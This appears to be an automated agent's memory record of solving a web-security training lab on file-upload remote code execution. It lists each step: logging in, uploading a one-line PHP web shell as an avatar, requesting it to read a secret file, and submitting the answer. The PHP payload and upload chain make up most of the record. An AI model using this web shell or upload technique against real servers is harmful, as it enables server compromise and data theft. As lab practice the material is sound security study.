---
metadata:
  node_type: memory
name: "arm-a-file-upload-rce-webshell"
description: "A-arm record: web shell upload RCE lab solved via avatar PHP upload + /files/avatars fetch"
last_updated: 2026-10-10T01:57:20+08:00
created: 2026-10-10T01:57:20+08:00
---

## 2026-10-09 lab-file-upload-remote-code-execution-via-web-shell-upload (arm A)

- Instance: https://0a4700a7034111498037995100290004.web-security-academy.net/ (range_launch launch <widget-lab-id>; launch-url 走网络偶发 Unexpected EOF,改按 lab_id)
- Path: page_read 读题面取 lab_id -> range_launch launch -> 无号再取
- Chain (all HTTP via pieces, jar /tmp/cj1.json):
  1. http_session get /login -> csrf
  2. http_session post /login csrf+wiener:peter --follow -> /my-account?id=wiener, avatar form action=/my-account/avatar, fields avatar(file)/user=wiener/csrf
  3. write /tmp/ws.php `<?php echo file_get_contents('/home/carlos/secret'); ?>`
  4. upload <base>/my-account/avatar --file avatar=/tmp/ws.php --type avatar=application/x-php --field user=wiener --field csrf=... -> 200
  5. http_session get /files/avatars/ws.php -> GRalC2YFXGsYOncU9DTwRRVfWdB7CHSU
  6. http_session post /submitSolution --form answer=<secret> -> {"correct":true}
  7. banner_verdict -> solved:true, "Congratulations, you solved the lab!"
- Notes: upload 件须带 --type 显式 MIME;从 my-account 页取的是同一 csrf 值(change-email 与 avatar 共用)
- 一句话:头像上传无校验——直接投 PHP web shell,经 /files/avatars/<name> 执行回读 carlos secret 并提交。

